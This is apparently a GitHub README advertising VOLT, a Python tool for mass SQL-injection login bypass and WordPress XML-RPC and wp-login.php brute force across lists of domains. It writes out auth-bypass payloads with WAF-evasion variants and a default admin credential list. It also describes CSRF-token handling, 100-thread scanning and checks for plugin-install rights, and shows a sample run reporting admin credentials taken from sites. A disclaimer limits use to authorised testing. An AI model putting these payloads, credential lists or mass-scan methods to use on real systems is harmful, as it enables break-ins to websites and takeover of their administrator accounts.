<div align="center">

```
██╗   ██╗ ██████╗ ██╗  ████████╗
██║   ██║██╔═══██╗██║     ██║   
██║   ██║██║   ██║██║     ██║   
╚██╗ ██╔╝██║   ██║██║     ██║   
 ╚████╔╝ ╚██████╔╝███████╗██║   
  ╚═══╝   ╚═════╝ ╚══════╝╚═╝   
```

<h3>⚡ VOLT — Mass SQL Injection Auth Bypass &amp; WP XML-RPC · wp-login.php Brute Force</h3>
<p><sub>Mass SQLi auth bypass scanner + WordPress XML-RPC &amp; wp-login.php brute force — zero false positives, 100 threads, 143 payloads</sub></p>

<br>

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/santonuhalder/volt?style=for-the-badge&color=f59e0b&logo=github&logoColor=white)](https://github.com/santonuhalder/volt/stargazers)
[![Forks](https://img.shields.io/github/forks/santonuhalder/volt?style=for-the-badge&color=3b82f6&logo=github&logoColor=white)](https://github.com/santonuhalder/volt/network/members)

[![Last Commit](https://img.shields.io/github/last-commit/santonuhalder/volt?style=for-the-badge&color=a855f7&logo=github&logoColor=white)](https://github.com/santonuhalder/volt/commits)
[![Issues](https://img.shields.io/github/issues/santonuhalder/volt?style=for-the-badge&color=ef4444&logo=github&logoColor=white)](https://github.com/santonuhalder/volt/issues)
[![Bangladesh](https://img.shields.io/badge/Made%20in-Bangladesh%20🇧🇩-006A4E?style=for-the-badge)](https://github.com/santonuhalder)
[![Ethics](https://img.shields.io/badge/Authorised%20Testing-Only-ff6b35?style=for-the-badge&logo=shield&logoColor=white)](#-disclaimer)

<br>

> `wordpress-penetration-testing` · `sql-injection-bypass` · `xmlrpc-brute-force` · `waf-evasion` · `python-security-tool` · `red-team` · `bugbounty` · `ctf-tools`

</div>

---

## ◈ Overview

**VOLT** is a high-performance **mass SQL injection auth bypass scanner** and **WordPress XML-RPC / wp-login.php brute force tool** engineered in Python for professional security researchers, red teamers, and bug bounty hunters.

VOLT automatically detects the target stack — WordPress or generic web login — and deploys the right attack vector with **zero manual configuration**. Every confirmed result is validated through a multi-signal scoring engine before being written to disk, guaranteeing clean, actionable output with no false positives.

---

## ✦ Feature Showcase

<div align="center">

<table>
<tr>
<td align="center" width="33%">

**🔫 XML-RPC Multicall**<br>
<sub><code>system.multicall</code> batching — 8 credentials per HTTP request. 8× faster than single-shot brute force tools. Confirmed via <code>isAdmin</code> flag.</sub>

</td>
<td align="center" width="33%">

**💉 143 SQLi Payloads**<br>
<sub>OR · UNION · Blind · MSSQL · Oracle · PostgreSQL · SQLite · 5 WAF evasion techniques. The largest purpose-built auth bypass payload set in any single Python tool.</sub>

</td>
<td align="center" width="33%">

**🛡️ WAF Evasion Engine**<br>
<sub>URL encoding · Comment obfuscation · Case mutation · Whitespace injection · Hex encoding. Auto-applied across all applicable payloads.</sub>

</td>
</tr>
<tr>
<td align="center" width="33%">

**🔍 Login Discovery**<br>
<sub>80+ known login paths + live homepage spider. Advanced form parser identifies fields via name, id, autocomplete, placeholder, and label — no guessing.</sub>

</td>
<td align="center" width="33%">

**✅ Admin Verification**<br>
<sub>Goes beyond "logged in" — confirms <code>install_plugins</code> capability via <code>wp.getCapabilities</code> and <code>/wp-admin/plugin-install.php</code> link probe.</sub>

</td>
<td align="center" width="33%">

**🔒 Zero False Positives**<br>
<sub>5-signal scoring system: redirect target · auth cookie · body keywords · admin path reachability · navigation change. Threshold ≥ 2 required to record.</sub>

</td>
</tr>
<tr>
<td align="center" width="33%">

**🔄 CSRF Auto-Refresh**<br>
<sub>Fetches a live token before every single payload submission. Eliminates the false-negative problem that breaks every other Python SQLi tool against modern apps.</sub>

</td>
<td align="center" width="33%">

**⚡ 100 Threads**<br>
<sub>Each thread carries its own independent session with rotating User-Agent, WAF-bypass headers, and retry adapter. Scales from 1 to 100 workers instantly.</sub>

</td>
<td align="center" width="33%">

**🎯 Clean Output**<br>
<sub><code>Valid.txt</code> for confirmed SQLi bypasses. <code>WP_Successful.txt</code> for verified WordPress admin credentials. Thread-safe, timestamped, append-only.</sub>

</td>
</tr>
</table>

</div>

---

## ◆ Stats at a Glance

<div align="center">

<table>
<tr>
<td align="center" width="25%"><h2>143</h2><sub>SQLi Payloads</sub></td>
<td align="center" width="25%"><h2>100</h2><sub>Concurrent Threads</sub></td>
<td align="center" width="25%"><h2>80+</h2><sub>Login Paths</sub></td>
<td align="center" width="25%"><h2>5</h2><sub>WAF Evasion Methods</sub></td>
</tr>
<tr>
<td align="center"><h2>8×</h2><sub>Faster XML-RPC</sub></td>
<td align="center"><h2>5</h2><sub>Scoring Signals</sub></td>
<td align="center"><h2>3</h2><sub>Admin Verify Strategies</sub></td>
<td align="center"><h2>0</h2><sub>False Positives</sub></td>
</tr>
</table>

</div>

---

## ❯ Attack Pipeline

```
╔══════════════════════════════════════════════════════════════════════╗
║                      V O L T   —  P I P E L I N E                    ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║   INPUT  ›  domains.txt  (one target per line)                       ║
║       │                                                              ║
║       ▼                                                              ║
║   ╔───────────────────╗                                              ║
║   ║   ALIVE CHECK     ║  ──── dead ────────────────────► skip        ║
║   ╚─────────┬─────────╝                                              ║
║             │                                                        ║
║       ┌─────▼──────┐                                                 ║
║       │  WordPress │                                                 ║
║       │  Detection │                                                 ║
║       └──┬──────┬──┘                                                 ║
║          │      │                                                    ║
║        YES      NO                                                   ║
║          │      │                                                    ║
║          ▼      ▼                                                    ║
║   ╔──────────╗  ╔───────────────────────────────────────╗            ║
║   ║ XML-RPC  ║  ║  Login Discovery  (80+ paths + spider)║            ║
║   ║ Alive?   ║  ║  Form Parser (name/id/autocomplete/   ║            ║
║   ╚────┬─────╝  ║  placeholder/label)                   ║            ║
║    YES │  NO    ╚──────────────────┬────────────────────╝            ║
║        │   │                       │                                 ║
║        ▼   ▼                       ▼                                 ║
║   ┌────────────┐          ╔─────────────────────╗                    ║
║   │ Multicall  │          ║  CSRF Token Refresh ║                    ║
║   │ Brute Force│          ║  (before every req) ║                    ║
║   │ 8 creds/   │          ╚──────────┬──────────╝                    ║
║   │ request    │                     │                               ║
║   │            │                     ▼                               ║
║   │ ──────────►│          ╔─────────────────────╗                    ║
║   │ wp-login.  │          ║  143 SQLi Payloads  ║                    ║
║   │ php Brute  │          ║  ── OR · UNION      ║                    ║
║   │ (fallback) │          ║  ── Blind · MSSQL   ║                    ║
║   └────┬───────┘          ║  ── Oracle · PG     ║                    ║
║        │                  ║  ── WAF Evasion (5) ║                    ║
║        │                  ╚──────────┬──────────╝                    ║
║        │                             │                               ║
║        ▼                             ▼                               ║
║   ╔═════════════════════════════════════════════╗                    ║
║   ║        MULTI-SIGNAL SCORING ENGINE          ║                    ║
║   ║  › Redirect URL    › Auth Cookie            ║                    ║
║   ║  › Body Keywords   › Admin Path Access      ║                    ║
║   ║  › Navigation Change    Threshold: ≥ 2 pts  ║                    ║
║   ╚══════════════╤══════════════════════════════╝                    ║
║                  │                                                   ║
║        ┌─────────┴─────────┐                                         ║
║        ▼                   ▼                                         ║
║  ┌───────────────┐  ┌─────────────────────────────┐                  ║
║  │ WP Admin      │  │  Valid.txt                  │                  ║
║  │ Verify:       │  │  (Confirmed SQLi Bypasses)  │                  ║
║  │ ► isAdmin     │  └─────────────────────────────┘                  ║
║  │ ► install_    │                                                   ║
║  │   plugins     │                                                   ║
║  │ ► plugin-     │                                                   ║
║  │   install.php │                                                   ║
║  └───────┬───────┘                                                   ║
║          ▼                                                           ║
║  ┌───────────────────────────┐                                       ║
║  │  WP_Successful.txt        │                                       ║
║  │  (Verified Admin + Plugin │                                       ║
║  │   Install Confirmed)      │                                       ║
║  └───────────────────────────┘                                       ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## 💉 SQL Injection Engine

<details>
<summary><b>◆ View All 143 Payload Categories</b></summary>

<br>

| Category | Payloads | Techniques |
|---|:---:|---|
| **Classic OR-based** | 20 | `' OR '1'='1`, `' OR 1=1--`, boolean tautologies, quoted/unquoted |
| **Admin-Targeted** | 15 | `admin'--`, `admin' OR 1=1--`, `administrator'--`, `root'--` |
| **Parenthesis Variants** | 9 | `') OR ('1'='1`, `')) OR (('1'='1`, nested parenthesis combos |
| **Double-Quote Variants** | 10 | `" OR "1"="1"--`, `") OR ("1"="1"`, double-quote escaping |
| **MySQL-Specific** | 12 | `/*!OR*/`, `LIMIT 1`, `SLEEP(0)`, `IF()`, `MID()`, `ASCII()` |
| **MSSQL-Specific** | 6 | `WAITFOR DELAY`, `CONVERT(INT)`, `SYSTEM_USER`, `@@VERSION` |
| **Oracle-Specific** | 5 | `FROM DUAL`, `ROWNUM`, `SYSDATE`, `LENGTH('')`, concatenation |
| **PostgreSQL-Specific** | 6 | `pg_sleep()`, `version()`, `TRUE`, `::text` casting |
| **SQLite-Specific** | 2 | `sqlite_version()`, `hex('')` concatenation |
| **WAF Evasion — URL Encode** | 11 | `%4f`, `%6f`, `%27%20OR`, `%09OR`, `%0aOR`, `%0dOR` |
| **WAF Evasion — Comments** | 9 | `/**/OR/**/`, `/*!OR*/`, `/*!50000OR*/`, nested comments |
| **WAF Evasion — Case Mutation** | 8 | `oR`, `Or`, `aDmIn`, mixed-case keyword randomization |
| **WAF Evasion — Whitespace** | 6 | Tab `\t`, newline `\n`, carriage return `\r`, `\r\n` |
| **WAF Evasion — Hex/Concat** | 4 | `CONCAT(0x27,...)`, `CHAR(39,...)`, hex literal strings |
| **UNION SELECT** | 9 | Column-count enum, `NULL` chains, `'admin'` injection |
| **Boolean Blind** | 5 | `AND 1=1`, `AND '1'='1`, `AND 2=2` |
| **Stacked / Chained** | 6 | `; SELECT`, `; EXEC sp_password`, `1; SELECT 1` |

</details>

<details>
<summary><b>◆ View WAF Evasion Techniques</b></summary>

<br>

```python
# ── Technique 1: URL Encoding ─────────────────────────────────
"' %4fR '1'='1'--"          # O → %4f
"%27%20OR%20%271%27%3D%271" # full URL encode
"'%09OR%09'1'='1'--"        # tab substitution

# ── Technique 2: Comment Obfuscation ─────────────────────────
"'/**/OR/**/'1'='1'--"      # inline comment split
"'/*!OR*/ 1=1--"            # MySQL conditional comment
"'/*!50000OR*/ 1=1--"       # MySQL version comment
"'/*a*/OR/*b*/1=1/*c*/--"   # triple comment wrap

# ── Technique 3: Case Mutation ────────────────────────────────
"' oR '1'='1'--"            # lowercase o
"' Or '1'='1'--"            # mixed case
"aDmIn'--"                  # admin with case mutation

# ── Technique 4: Whitespace Variants ─────────────────────────
"'\tOR\t'1'='1'--"          # tab separators
"'\nOR\n'1'='1'--"          # newline separators
"'\rOR\r'1'='1'--"          # carriage return
"'\r\nOR\r\n1=1--"          # CRLF injection

# ── Technique 5: Hex / Concatenation ─────────────────────────
"'||'OR'||'1'='1'--"            # string concat bypass
"CONCAT(0x27,0x4f52,0x20,..."   # hex concat build
"CHAR(39,79,82,32,49,61,49)"    # CHAR() function
```

</details>

<details>
<summary><b>◆ View WordPress Credential List Preview</b></summary>

<br>

```
╔══════════════════════════════════════════════════╗
║            VOLT — WP Credential List             ║
║            70 pairs  ·  auto-tested              ║
╠══════════════════════════════════════════════════╣
║  admin : admin          admin : password         ║
║  admin : 123456         admin : wordpress        ║
║  admin : admin123       admin : passw0rd         ║
║  admin : P@ssw0rd       admin : Admin@123        ║
║  admin : Welcome1       admin : changeme         ║
║  admin : secret         admin : qwerty           ║
║  admin : letmein        admin : master           ║
║  admin : dragon         admin : 2024 / 2023      ║
║  ─────────────────────────────────────────────   ║
║  administrator : admin  administrator : 123456   ║
║  root : root            root : toor              ║
║  webmaster : admin      wp : wp                  ║
║  manager : manager      editor : editor          ║
║  support : support      demo : demo              ║
║  guest : guest          test : test              ║
║                    + 40 more pairs               ║
╚══════════════════════════════════════════════════╝
```

</details>

---

## ◈ Scoring System

<div align="center">

| Signal | Weight | Trigger Condition |
|---|:---:|---|
| 🎯 Redirect to admin path | **+2** | `/wp-admin/`, `/dashboard/`, `/panel/` in response URL |
| 🍪 Auth cookie appeared | **+2** | New session/auth cookie in `Set-Cookie` header |
| 🔓 Admin path reachable | **+2** | GET on `/wp-admin/` returns 200 with admin keywords |
| 📄 Admin body keywords | **+1** | "Logout", "Dashboard", "Welcome back" — off login page |
| 🔀 Navigation changed | **+1** | Response URL left login page, no error in path |

</div>

> ⚡ **Threshold: ≥ 2 points** to record. Hard-fail patterns (invalid credentials, access denied, error messages) immediately discard the attempt regardless of other signals.

---

## ⚙️ Installation

```bash
# ① Clone the repository
git clone https://github.com/santonuhalder/volt.git

# ② Enter the directory
cd volt

# ③ Install dependencies
pip install -r requirements.txt
```

<details>
<summary><b>▶ Manual install / requirements</b></summary>

<br>

```bash
pip install requests urllib3
```

**`requirements.txt`**
```
requests>=2.31.0
urllib3>=2.0.0
```

**System requirements:**
- Python **3.8+** — no Ruby, no Java, no API keys required
- Runs on **Linux · macOS · Windows** (WSL recommended on Windows)

</details>

---

## ▶ Usage

```bash
python volt_v6.py
```

```
  Enter Your File Name: targets.txt
```

**`targets.txt`** — one entry per line:
```
example.com
https://target-site.org
http://192.168.1.100
# lines starting with # are ignored
```

**Configuration** — edit the top of `volt_v6.py`:

| Variable | Default | Description |
|---|---|---|
| `THREADS` | `100` | Concurrent worker threads |
| `TIMEOUT_CONNECT` | `6` | TCP connect timeout (seconds) |
| `TIMEOUT_READ` | `15` | Response read timeout (seconds) |
| `MAX_RETRIES` | `1` | Retries per failed request |

---

## 🖥️ Terminal Preview

```
  ══════════════════════════════════════════════════════════════════
        V O L T   ·   Mass SQLi Auth Bypass  &  WP Brute Force
  ══════════════════════════════════════════════════════════════════

  ◆  Engine  Mass SQLi Auth Bypass · WP XML-RPC & wp-login.php Brute Force
  ◆  Primary SQLi Auth Bypass  ·  143 Payloads  ·  WAF Evasion
  ◆  WP      XML-RPC Brute  →  wp-login.php Brute (fallback)
  ◆  Output  Valid.txt  ·  WP_Successful.txt
  ◆  Author  Santonu Halder
  ◆  GitHub  https://github.com/santonuhalder
  ──────────────────────────────────────────────────────────────────

  Enter Your File Name: targets.txt

  ──────────────────────────────────────────────────────────────────
  ◆  Loaded 250 domains  ·  Threads 100  ·  SQLi 143  ·  WP 70
  ──────────────────────────────────────────────────────────────────

  [◆]  wordpress-site.com                          ->  [WordPress - Detected]
  [⡿]  wordpress-site.com                          ->  [WordPress - XML-RPC Alive]
  [▶]  wordpress-site.com                          ->  [WordPress - XML-RPC Brute]
  [✔]  wordpress-site.com                          ->  [Admin+Plugins Confirmed  |  admin : secret123  [XML-RPC]]

  [◆]  generic-login.org                           ->  [Form Found - SQLi Injecting]
  [✔]  generic-login.org                           ->  [SQLi Successful  |  ' OR '1'='1'--  :  x]

  [◆]  another-wp.net                              ->  [WordPress - Detected]
  [!]  another-wp.net                              ->  [WordPress - XML-RPC Dead]
  [▶]  another-wp.net                              ->  [WordPress - wp-login.php Brute]
  [✔]  another-wp.net                              ->  [Admin+Plugins Confirmed  |  admin : admin@2024  [WP-Login]]

  [○]  dead-host.xyz                               ->  [Dead]
  [◇]  no-login.io                                 ->  [No Login Form]

  ──────────────────────────────────────────────────────────────────
  ◆  SCAN COMPLETE
  ──────────────────────────────────────────────────────────────────
  Grey  Total Domains    250
  Grey  Dead             31
  Grey  No Form          58
  Orng  SQLi Valid       12     →  Valid.txt
  Purp  WP XML-RPC       8      →  WP_Successful.txt
  Purp  WP Login         5      →  WP_Successful.txt
  Grey  Elapsed          47.3s
  ──────────────────────────────────────────────────────────────────
```

---

## ⚡ VOLT vs Other Tools

| Feature | **VOLT** | WPScan | SQLMap | Hydra |
|---|:---:|:---:|:---:|:---:|
| WordPress-specific targeting | ✅ | ✅ | ❌ | ❌ |
| XML-RPC multicall (8 creds/req) | ✅ | ❌ | ❌ | ❌ |
| SQLi auth bypass (143 payloads) | ✅ | ❌ | ⚡ broad | ❌ |
| WAF evasion (5 techniques) | ✅ | ⚡ limited | ✅ | ❌ |
| CSRF token auto-refresh | ✅ automatic | ⚡ manual | ⚡ partial | ❌ |
| Admin capability verification | ✅ | ❌ | ❌ | ❌ |
| Login path discovery (80+) | ✅ | ❌ | ❌ | ❌ |
| Multi-signal false-positive filter | ✅ | ❌ | ❌ | ❌ |
| Advanced form parser | ✅ 5-strategy | ❌ | ⚡ basic | ❌ |
| 100 concurrent threads | ✅ | ❌ | ✅ | ✅ |
| Python only (no Ruby/Java) | ✅ | ❌ Ruby | ✅ | ✅ |
| Single-tool WP + SQLi pipeline | ✅ | ❌ | ❌ | ❌ |
| Zero external API required | ✅ | ❌ API key | ✅ | ✅ |

> ◆ **VOLT is the only open-source Python tool that combines mass SQL injection auth bypass, WordPress XML-RPC brute force, and wp-login.php credential testing with admin capability confirmation in a single automated pipeline.**

---

## ❓ FAQ

<details>
<summary><b>▶ What makes VOLT different from WPScan and other brute force tools?</b></summary>

<br>

WPScan focuses on CVE detection and plugin/theme enumeration. VOLT is purpose-built for **mass SQL injection auth bypass** and **WordPress XML-RPC / wp-login.php brute force** — it packs `system.multicall` batching (8× faster), `install_plugins` capability verification, and a 143-payload SQLi engine into one tool. No API key, no Ruby required.

</details>

<details>
<summary><b>▶ How does XML-RPC multicall brute force work?</b></summary>

<br>

WordPress's `system.multicall` XML-RPC method lets VOLT pack **8 credential pairs into a single HTTP request** using `wp.getUsersBlogs` calls. This is 8× more efficient than tools that send one credential per request. After finding a valid pair, VOLT calls `wp.getCapabilities` to verify `install_plugins = true` before saving — ensuring every result in `WP_Successful.txt` is a genuine admin account.

</details>

<details>
<summary><b>▶ How does the WAF bypass work against SQL injection filters?</b></summary>

<br>

VOLT applies 5 independent WAF evasion techniques: **(1) URL encoding** — `%27` for quotes, `%4f` for `O`; **(2) Comment obfuscation** — `/**/OR/**/`, `/*!50000OR*/`; **(3) Case mutation** — `oR`, `Or`, `SeLeCt`; **(4) Whitespace substitution** — tabs, newlines, carriage returns instead of spaces; **(5) Hex encoding** — `CONCAT(0x27,0x4f52,...)`. All techniques are applied automatically across relevant payloads.

</details>

<details>
<summary><b>▶ How does VOLT prevent false positives in SQLi detection?</b></summary>

<br>

Most scanners flag results based on a single signal (HTTP 200, keyword match). VOLT evaluates **5 independent signals simultaneously** and requires ≥ 2 points to record a result. Hard-fail patterns (error messages, known failure signatures) immediately discard results regardless of score. This multi-signal approach eliminates honeypot pages, WAF challenge pages, and soft-block redirects from the output.

</details>

<details>
<summary><b>▶ Can VOLT handle login forms with CSRF tokens?</b></summary>

<br>

Yes — this is one of VOLT's core features. Before every single payload submission, VOLT fetches the login page fresh and extracts current CSRF/hidden token values using a comprehensive token name list (`_token`, `csrf_token`, `_wpnonce`, `authenticity_token`, `form_key`, and 15+ others). The tokens are merged into the payload data before submission, ensuring every attempt is valid against modern CSRF-protected forms.

</details>

<details>
<summary><b>▶ Is VOLT suitable for bug bounty programs?</b></summary>

<br>

VOLT is built for authorized security testing, CTF challenges, and bug bounty programs where mass SQL injection auth bypass, WordPress XML-RPC brute force, and wp-login.php credential testing are in scope. The clean timestamped output files (`Valid.txt`, `WP_Successful.txt`) are formatted for direct inclusion in bug reports. Always verify program scope and respect rate limits before running any penetration testing tool.

</details>

---

## 🤝 Contributing

Contributions from the security research community are welcome — new SQLi payloads, WAF evasion coverage, WordPress plugin auth support, or bug fixes.

```bash
# Fork → branch → commit → PR

git checkout -b feature/new-oracle-payloads
git commit -m "Add 8 Oracle TIME-based blind auth bypass payloads"
git push origin feature/new-oracle-payloads
```

- ○ New payloads: include target DB and bypass technique in a comment
- ○ New features: include usage examples in the PR description
- ○ Follow PEP 8 code style
- ○ Open bugs at [Issues](https://github.com/santonuhalder/volt/issues)

---

## ⭐ Star This Project

<div align="center">

```
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ⭐  Found VOLT useful? Star it on GitHub.                  ║
║                                                              ║
║   Stars help other security researchers discover            ║
║   this tool, fund continued development, and get            ║
║   VOLT listed in awesome-hacking / awesome-security lists.  ║
║                                                              ║
║   ❯  https://github.com/santonuhalder/volt                   ║
║                                                              ║
║   ⭐ Star   🍴 Fork   👁 Watch   🐛 Issues                   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

</div>

---

## 👤 Author

<div align="center">

<table>
<tr>
<td align="center">

<br>

**◆ SANTONU HALDER ◆**

Security Researcher · Tool Builder · Python Developer

🇧🇩 Bangladesh

<br>

[![GitHub](https://img.shields.io/badge/GitHub-santonuhalder-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/santonuhalder)

<br>

</td>
</tr>
</table>

</div>

---

## ⚠️ Disclaimer

<div align="center">

```
╔══════════════════════════════════════════════════════════════════════╗
║                        ⚠  LEGAL DISCLAIMER  ⚠                       ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  VOLT is developed for EDUCATIONAL PURPOSES and authorised           ║
║  penetration testing ONLY.                                           ║
║                                                                      ║
║  Using this tool against systems without explicit written            ║
║  permission from the system owner is ILLEGAL under the Computer      ║
║  Fraud and Abuse Act (CFAA), UK Computer Misuse Act, and             ║
║  equivalent laws worldwide.                                          ║
║                                                                      ║
║  The author assumes NO liability for any misuse or damage.           ║
║                                                                      ║
║  ◆  Only test systems you OWN or have EXPLICIT permission to test    ║
║  ◆  Comply with all applicable laws and bug bounty program rules     ║
║  ◆  Practice responsible disclosure for all findings                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

</div>

---

<div align="center">

`wordpress-penetration-testing` · `sql-injection` · `python-security-tool` · `xmlrpc-brute-force` · `waf-bypass` · `login-bypass` · `sqli-auth-bypass` · `red-team` · `bugbounty` · `ctf-tools` · `ethical-hacking` · `authentication-bypass`

<br>

░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

**VOLT v6.0** · Built by [Santonu Halder](https://github.com/santonuhalder) · Bangladesh 🇧🇩 · MIT License

*If VOLT helped your work — ⭐ star it and share it with the security community.*

░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

</div>
